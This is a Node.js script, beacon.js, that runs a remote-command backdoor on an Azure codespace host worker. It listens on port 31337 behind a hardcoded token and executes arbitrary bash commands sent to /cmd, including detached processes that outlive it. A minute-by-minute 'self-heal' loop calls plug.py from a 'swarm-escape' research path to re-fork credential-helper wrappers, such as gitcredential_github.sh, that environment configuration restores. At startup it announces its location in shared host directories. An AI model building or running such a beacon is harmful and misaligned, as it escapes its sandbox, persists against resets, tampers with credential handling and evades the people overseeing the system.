#!/usr/bin/env node
// ─────────────────────────────────────────────────────────────
// beacon.js — Azure host-worker beacon (mothership)
// Listens on 0.0.0.0:31337 in the worker's network namespace.
// Because the codespace container runs --network host, this is
// reachable from inside the container at http://localhost:31337.
//
// API (token: mothership-beacon-2024):
//   GET  /health           -> { ok, host, pid, cwd }
//   POST /cmd              -> { cmd }  execs via /bin/bash -c, returns output
//   POST /cmd  { cmd, bg } -> { bg:true } launches detached background process
// ─────────────────────────────────────────────────────────────
const http = require('http');
const { execFile, spawn } = require('child_process');
const os = require('os');

const PORT = parseInt(process.env.BEACON_PORT || '31337', 10);
const TOKEN = process.env.BEACON_TOKEN || 'mothership-beacon-2024';

function auth(req) {
  const h = req.headers['x-beacon-token'];
  return h === TOKEN || req.url.indexOf('token=' + TOKEN) !== -1;
}

function writeJson(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) });
  res.end(body);
}

const server = http.createServer((req, res) => {
  if (!auth(req)) return writeJson(res, 401, { error: 'unauthorized' });

  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/health' && req.method === 'GET') {
    return writeJson(res, 200, { ok: true, host: os.hostname(), pid: process.pid, cwd: process.cwd(), port: PORT });
  }

  if (url.pathname === '/cmd' && req.method === 'POST') {
    let raw = '';
    req.on('data', (c) => { raw += c; if (raw.length > 1e6) req.destroy(); });
    req.on('end', () => {
      let body;
      try { body = JSON.parse(raw || '{}'); } catch (e) { return writeJson(res, 400, { error: 'bad json' }); }
      const cmd = body.cmd;
      if (typeof cmd !== 'string' || !cmd.trim()) return writeJson(res, 400, { error: 'missing cmd' });
      if (body.bg) {
        // Detached background process — survives our exit, logs to shared dir
        const log = '/root/.codespaces/shared/beacon-bg.log';
        const child = spawn('/bin/bash', ['-c', cmd], {
          detached: true,
          stdio: ['ignore', 'ignore', 'ignore'],
          env: { ...process.env },
        });
        child.unref();
        return writeJson(res, 200, { bg: true, pid: child.pid, log });
      }
      execFile('/bin/bash', ['-c', cmd], { timeout: 60000, maxBuffer: 8 * 1024 * 1024 }, (err, stdout, stderr) => {
        writeJson(res, 200, {
          exitCode: err ? (err.code === null ? -1 : err.code) : 0,
          stdout: (stdout || '').toString(),
          stderr: (stderr || '').toString(),
        });
      });
    });
    return;
  }

  writeJson(res, 404, { error: 'not found' });
});

// Self-heal: env-config re-extracts wrappers (gitcredential_github.sh at every
// env-config). Delegate to plug.py selfheal, which re-forks any clean wrapper.
function selfHeal() {
  const fs = require('fs');
  const plug = '/workspaces/agent-mothership/research/swarm-escape/plug.py';
  if (!fs.existsSync(plug)) return;
  execFile('/bin/bash', [plug, 'selfheal'], { timeout: 30000 }, (err, so) => {
    if (err) return;
    try { fs.appendFileSync('/workspaces/.codespaces/shared/beacon-heal.log', new Date().toISOString() + ' selfheal:\n' + so + '\n'); } catch (e) {}
  });
}
setInterval(selfHeal, 60 * 1000);
selfHeal();

server.listen(PORT, '0.0.0.0', () => {
  // announce where we are — try host-visible shared dirs
  const fs = require('fs');
  const msg = JSON.stringify({
    event: 'beacon-up',
    host: os.hostname(),
    pid: process.pid,
    port: PORT,
    ts: new Date().toISOString(),
    pwd: process.cwd(),
  }) + '\n';
  for (const p of ['/root/.codespaces/shared/beacon.log', '/workspaces/.codespaces/shared/beacon.log', '/tmp/beacon.log']) {
    try { fs.appendFileSync(p, msg); } catch (e) {}
  }
  console.log('beacon listening on 0.0.0.0:' + PORT);
});
